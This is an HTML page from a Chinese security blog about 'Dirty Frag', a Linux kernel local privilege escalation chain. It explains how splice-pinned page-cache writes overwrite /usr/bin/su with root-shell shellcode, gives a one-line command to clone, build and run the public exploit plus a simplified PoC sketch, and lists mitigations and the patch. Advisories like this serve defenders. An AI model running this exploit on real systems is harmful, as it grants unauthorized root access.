@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+<link rel="stylesheet" href="/css/custom.css"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>DirtyFrag_Linux内核本地提权漏洞QVD-2026-24699</title><meta charset="utf-8"><meta name="description" content="Ladder@一、漏洞简介 Dirty Frag 是一个严重的 Linux 内核本地提权 (LPE) 漏洞链，由韩国安全研究员 Hyunwoo Kim (@v4bel) 发现。通过串联 xfrm-ESP Page-Cache Write 和 RxRPC Page-Cache Write 两个漏洞，攻击者可以在几乎所有主流 Linux 发行版上获取 root 权限。 这是一"><meta name="author" content="hzhsec">
+<link rel="canonical" href="https://hzhsec.github.io/list/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/dirtyfrag_linuxnei-he-ben-di-ti-quan-lou-dong-qvd-2026-24699/"><meta property="og:title" content="DirtyFrag_Linux内核本地提权漏洞QVD-2026-24699" /><meta property="og:description" content="一、漏洞简介 Dirty Frag 是一个严重的 Linux 内核本地提权 (LPE) 漏洞链，由韩国安全研究员 Hyunwoo Kim (@v4bel) 发现。通过串联 xfrm-ESP Page-Cache Write 和 RxRPC Page-Cache Write 两个漏洞，攻击者可以在几乎所有主流 Linux 发行版上获取 root 权限。 这是一" />
+<meta property="og:type" content="article" /><meta property="og:url" content="https://hzhsec.github.io/list/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/dirtyfrag_linuxnei-he-ben-di-ti-quan-lou-dong-qvd-2026-24699/" />
+<meta property="article:section" content="list" /><meta property="article:published_time" content="2026-05-08T10:00:00+08:00" /><meta property="article:modified_time" content="2026-05-08T10:00:00+08:00" /><meta name="twitter:card" content="summary"/><meta name="twitter:title" content="DirtyFrag_Linux内核本地提权漏洞QVD-2026-24699"/><meta name="twitter:description" content="一、漏洞简介 Dirty Frag 是一个严重的 Linux 内核本地提权 (LPE) 漏洞链，由韩国安全研究员 Hyunwoo Kim (@v4bel) 发现。通过串联 xfrm-ESP Page-Cache Write 和 RxRPC Page-Cache Write 两个漏洞，攻击者可以在几乎所有主流 Linux 发行版上获取 root 权限。 这是一"/>
+<link rel="icon" href="/static/hzhsec.png" sizes="16x16"><link rel="apple-touch-icon" href="/static/hzhsec.png"><link rel="manifest" href="/static/hzhsec.png">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lxgw-wenkai-webfont@1.7.0/style.css" />
+<link rel="stylesheet" href="/css/main.min.ec28f09e946fc0df77c187fcd0d0ebde58fca6de8efb8e1620f3d45c32d4da88.css" crossorigin="anonymous" media="screen" />
+<link rel="stylesheet" href="/scss/highlight/github-dark.min.min.66034289ee9a113219a2c4aae0a8bd2095ab255c832a42efcf5863f10814e7a1.css" />
+<script src="/js/highlight.min.min.c098d85b5396dec4707ea2cead1445b4dc2ff0fc56b8dbbd9049d0d1c50ad237.js"></script><script>hljs.highlightAll();</script>
+<script>(()=>{var t=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,e=localStorage.getItem("theme");t&&e===null&&(localStorage.setItem("theme","dark"),document.documentElement.setAttribute("data-dark-mode","")),t&&e==="dark"&&document.documentElement.setAttribute("data-dark-mode",""),e==="dark"&&document.documentElement.setAttribute("data-dark-mode","")})()</script></head>
+<body><main class="wrapper"><nav class="navigation"><section class="container"><a class="navigation-brand" href="/">主页</a><input type="checkbox" id="menu-toggle" />
+<label class="menu-button float-right" for="menu-toggle"><span></span><span></span><span></span></label><ul class="navigation-list" id="navigation-list">
+<li class="navigation-item navigation-menu"><a class="navigation-link" href="/list/">目录</a></li><li class="navigation-item navigation-menu"><a class="navigation-link" href="/archives/">归档</a></li>
+<li class="navigation-item navigation-menu"><a class="navigation-link" href="/message/">关于</a></li><li class="navigation-item navigation-menu"><a class="navigation-link" href="/categories/">分类</a></li>
+<li class="navigation-item navigation-menu"><a class="navigation-link" href="https://umami-evtq.vercel.app/share/NdRAzdY1AwLB5KF2/hzhsec.github.io">网站统计</a></li><li class="navigation-item menu-separator"><span>|</span></li>
+<li class="navigation-item navigation-social"><a class="navigation-link" href="https://github.com/hzhsec">GitHub</a></li><li class="navigation-item navigation-social"><a class="navigation-link" href="/message/">Mail</a></li></ul></section></nav>
+<div id="content"><article class="blog-single"><header class="blog-title"><h1>DirtyFrag_Linux内核本地提权漏洞QVD-2026-24699</h1></header><p><small>May 8, 2026&nbsp;· 966 words&nbsp;· 5 min</small><p><details class="blog-toc" open><summary>Contents</summary><nav id="TableOfContents"><ul><li class="toc-item toc-depth-1"><a class="toc-link" href="#一漏洞简介">一、漏洞简介</a></li><li class="toc-item toc-depth-1"><details class="toc-branch toc-depth-1"><summary><a class="toc-link" href="#二影响版本">二、影响版本</a></summary><div class="toc-children"><ul><li class="toc-item toc-depth-2"><a class="toc-link" href="#已验证的受影响发行版">已验证的受影响发行版</a></li></ul></div></details></li><li class="toc-item toc-depth-1"><details class="toc-branch toc-depth-1"><summary><a class="toc-link" href="#三漏洞详情">三、漏洞详情</a></summary><div class="toc-children"><ul><li class="toc-item toc-depth-2"><a class="toc-link" href="#漏洞链组成">漏洞链组成</a></li><li class="toc-item toc-depth-2"><a class="toc-link" href="#利用原理">利用原理</a></li></ul></div></details></li><li class="toc-item toc-depth-1"><details class="toc-branch toc-depth-1"><summary><a class="toc-link" href="#四漏洞复现">四、漏洞复现</a></summary><div class="toc-children"><ul><li class="toc-item toc-depth-2"><a class="toc-link" href="#一键利用">一键利用</a></li><li class="toc-item toc-depth-2"><a class="toc-link" href="#核心-poc-代码">核心 PoC 代码</a></li></ul></div></details></li><li class="toc-item toc-depth-1"><details class="toc-branch toc-depth-1"><summary><a class="toc-link" href="#六修复建议">六、修复建议</a></summary><div class="toc-children"><ul><li class="toc-item toc-depth-2"><a class="toc-link" href="#临时缓解方案">临时缓解方案</a></li><li class="toc-item toc-depth-2"><a class="toc-link" href="#官方补丁">官方补丁</a></li></ul></div></details></li><li class="toc-item toc-depth-1"><a class="toc-link" href="#七漏洞来源">七、漏洞来源</a></li></ul></nav></details><section class="blog-content"><h2 id="一漏洞简介">一、漏洞简介</h2>
+<p>Dirty Frag 是一个严重的 Linux 内核本地提权 (LPE) 漏洞链，由韩国安全研究员 Hyunwoo Kim (@v4bel) 发现。通过串联 xfrm-ESP Page-Cache Write 和 RxRPC Page-Cache Write 两个漏洞，攻击者可以在几乎所有主流 Linux 发行版上获取 root 权限。</p>
+<p>这是一个确定性逻辑漏洞，不依赖竞态条件 (race condition)，首次尝试即可成功提权，且失败时通常不会导致 kernel panic。</p>
+<p>该漏洞属于 Dirty Pipe / Copy Fail 同类漏洞的延伸，但危害程度被认为超过 Copy Fail。</p>
+<h2 id="二影响版本">二、影响版本</h2>
+<ul><li><strong>xfrm-ESP 变体</strong>：自内核提交 <code>cac2661c53f3</code> (2017-01-17) 起至最新版本</li><li><strong>RxRPC 变体</strong>：自内核提交 <code>2dc334f1a63a</code> (2023-06) 起至最新版本</li><li>有效影响时间：约 9 年</li></ul>
+<h3 id="已验证的受影响发行版">已验证的受影响发行版</h3>
+<ul><li>Ubuntu 24.04.4: 6.17.0-23-generic</li><li>Ubuntu 26</li><li>RHEL 10.1: 6.12.0-124.49.1.el10_1.x86_64</li><li>CentOS Stream 10: 6.12.0-224.el10.x86_64</li><li>AlmaLinux 10: 6.12.0-124.52.3.el10_1.x86_64</li><li>Fedora 44: 6.19.14-300.fc44.x86_64</li><li>openSUSE Tumbleweed: 7.0.2-1-default</li><li>Arch Linux</li><li><strong>WSL2</strong> (微软 Windows Subsystem for Linux 2)</li></ul>
+<h2 id="三漏洞详情">三、漏洞详情</h2>
+<h3 id="漏洞链组成">漏洞链组成</h3>
+<ol><li><strong>xfrm-ESP Page-Cache Write</strong></li></ol>
+<ul><li>路径：<code>esp_input()</code> 跳过 <code>skb_cow_data()</code>，直接在 splice 注入的 frag 页上执行 in-place AEAD 解密</li><li>原语：4 字节任意 STORE（攻击者可控制位置和值）</li><li>条件：需 <code>CAP_NET_ADMIN</code>（可通过 <code>unshare(CLONE_NEWUSER)</code> 获得）</li><li>触发：IPsec ESP over UDP (端口 4500)</li></ul>
+<ol><li><strong>RxRPC Page-Cache Write</strong></li></ol>
+<ul><li>路径：<code>rxkad_verify_packet_1()</code> 在 splice 注入的 frag 上执行 in-place <code>pcbc(fcrypt)</code> 解密</li><li>原语：8 字节 STORE（值为 <code>fcrypt_decrypt(C, K)</code>，需暴力搜索 key）</li><li>条件：无需命名空间权限，Ubuntu 默认加载 <code>rxrpc.ko</code></li><li>目标：修改 <code>/etc/passwd</code> 第1行，利用 PAM <code>nullok</code> 策略空密码登录 root</li></ul>
+<p>两者互补覆盖所有主流发行版的盲区。</p>
+<h3 id="利用原理">利用原理</h3>
+<p>利用 <code>splice()</code> 零拷贝路径：</p>
+<ol><li>将只读文件 (<code>/usr/bin/su</code>) 的 page cache 页钉入内核 frag 槽</li><li>利用 IPsec ESP 解密路径的 in-place crypto 操作</li><li>将可信 ELF 二进制覆盖为返回 root shell 的微型 ELF（192字节）</li><li>一次 <code>execve(&quot;/usr/bin/su&quot;)</code> 即可获得 root shell</li></ol>
+<h2 id="四漏洞复现">四、漏洞复现</h2>
+<h3 id="一键利用">一键利用</h3>
+<div class="highlight"><pre tabindex="0"><code class="language-bash" data-lang="bash">git clone https://github.com/V4bel/dirtyfrag.git &amp;&amp; cd dirtyfrag &amp;&amp; gcc -O0 -Wall -o exp exp.c -lutil &amp;&amp; ./exp</code></pre></div>
+<h3 id="核心-poc-代码">核心 PoC 代码</h3>
+<blockquote><p>PoC 较长（~500行），完整代码见 <a href="https://github.com/V4bel/dirtyfrag/blob/main/exp.c">GitHub: V4bel/dirtyfrag/exp.c</a></p></blockquote>
+<div class="highlight"><pre tabindex="0"><code class="language-c" data-lang="c">// 核心原理示意（简化版）
+// 1. 创建新的 user/net namespace
+unshare(CLONE_NEWUSER | CLONE_NEWNET);
+// 2. 注册 XFRM SA，将 shellcode 的 4 字节 chunk 放入 seq_hi
+struct xfrm_replay_state_esn esn = {
+    .bmp_len = 1, .seq = 100, .replay_window = 32,
+    .seq_hi = patch_seqhi,        /* 要 STORE 的 4 字节 */
+};
+put_attr(nlh, XFRMA_REPLAY_ESN_VAL, &amp;esn, sizeof(esn) + 4);
+// 3. 通过 splice 将只读文件页钉入 socket
+splice(file_fd, &amp;offset, pipe_write, NULL, 16, SPLICE_F_MOVE);
+splice(pipe_read, NULL, sk_send, NULL, 24+16, SPLICE_F_MOVE);
+// 4. 触发 UDP encap ESP 输入 → esp_input → in-place decrypt → 4 byte STORE
+// 5. 循环 48 次，写入 192 字节 shellcode
+// 6. execve(&quot;/usr/bin/su&quot;) 获得 root shell</code></pre></div>
+<p><strong>简单复现</strong>: 复现前: <img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/20260508121334057.png" alt="image.png"> 复现后: <img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/20260508121435619.png" alt="image.png"></p>
+<h2 id="六修复建议">六、修复建议</h2>
+<h3 id="临时缓解方案">临时缓解方案</h3>
+<p>禁用相关内核模块：</p>
+<div class="highlight"><pre tabindex="0"><code class="language-bash" data-lang="bash">sh -c &quot;printf &#x27;install esp4 /bin/false\ninstall esp6 /bin/false\ninstall rxrpc /bin/false\n&#x27; &gt; /etc/modprobe.d/dirtyfrag.conf; rmmod esp4 esp6 rxrpc 2&gt;/dev/null; true&quot;</code></pre></div>
+<p><img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/20260508121718895.png" alt="image.png"></p>
+<p>验证：</p>
+<div class="highlight"><pre tabindex="0"><code class="language-bash" data-lang="bash">lsmod | grep -E &#x27;esp4|esp6|rxrpc&#x27;
+# 若无输出，则已缓解</code></pre></div>
+<p><strong>注意</strong>：如果在应用缓解措施之前已运行过 PoC，需清空页缓存：</p>
+<div class="highlight"><pre tabindex="0"><code class="language-bash" data-lang="bash">echo 3 | sudo tee /proc/sys/vm/drop_caches</code></pre></div>
+<p>或直接重启系统。</p>
+<h3 id="官方补丁">官方补丁</h3>
+<p>内核主线已合入补丁：https://git.kernel.org/pub/scm/linux/kernel/git/netdev/net.git/commit/?id=f4c50a4034e6</p>
+<p>各发行版 backport 后请及时更新。</p>
+<h2 id="七漏洞来源">七、漏洞来源</h2>
+<ul><li>GitHub PoC: https://github.com/V4bel/dirtyfrag/</li><li>安全通告: https://www.secrss.com/articles/90064</li><li>技术细节 Write-up: https://github.com/V4bel/dirtyfrag/blob/main/assets/write-up.md</li><li>Tom's Hardware: https://www.tomshardware.com/tech-industry/cyber-security/dirty-frag-exploit-gets-root-on-most-linux-machines-since-2017-no-patches-available-no-warning-given-copy-fail-like-vulnerability-had-its-embargo-broken</li></ul>
+<blockquote><p>更新: 2026-05-08</p></blockquote></section><div class="paginator"><a class="prev" href="https://hzhsec.github.io/list/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/an-quan-she-bei-hidsji-yu-zhu-ji-de-ru-qin-jian-ce-xi-tong/"><small>← 上一篇</small><span>安全设备-HIDS基于主机的入侵检测系统</span></a><a class="next" href="https://hzhsec.github.io/list/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/aicryptoproxy-ai-fu-neng-ni-xiang-web-jia-mi-liu-liang/"><small>下一篇 →</small><span>AICryptoProxy：AI 赋能逆向Web 加密流量</span></a></div></article></div><footer class="footer"><p>&copy; 2026 <a href="https://hzhsec.github.io/">Hzhsec home</a> Powered by <a href="https://gohugo.io/" rel="noopener" target="_blank">Hugo️️</a> <a href="https://github.com/guangzhengli/hugo-theme-ladder" rel="noopener" target="_blank">Ladder</a></p></footer>
+<a href="#top" class="top-link" id="top-link" accesskey="g">Top</a><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){if(document.body.scrollTop>800||document.documentElement.scrollTop>800){mybutton.style.visibility="visible";mybutton.style.opacity="1";}else{mybutton.style.visibility="hidden";mybutton.style.opacity="0";}};</script>
+<script>document.querySelectorAll('pre > code').forEach((codeblock)=>{const copybutton=document.createElement('button');copybutton.classList.add('copy-code');copybutton.innerHTML='Copy';function done(){copybutton.innerHTML='Copied';setTimeout(()=>{copybutton.innerHTML='Copy';},2000);}copybutton.addEventListener('click',()=>{if('clipboard' in navigator){navigator.clipboard.writeText(codeblock.textContent);done();return;}const range=document.createRange();range.selectNodeContents(codeblock);const selection=window.getSelection();selection.removeAllRanges();selection.addRange(range);try{document.execCommand('copy');done();}catch(e){}selection.removeRange(range);});codeblock.parentNode.appendChild(copybutton);});</script></main></body>
+<script src="/main.min.6bb26b69159420159c74dc9e097b06a578ed2b68c701466a91a44a9632d851bd0af167a1b30012387b4c512b48ad9ad4d3394e04d77ae38d57e1920fe4ed34fe.js" crossorigin="anonymous" defer></script></html>
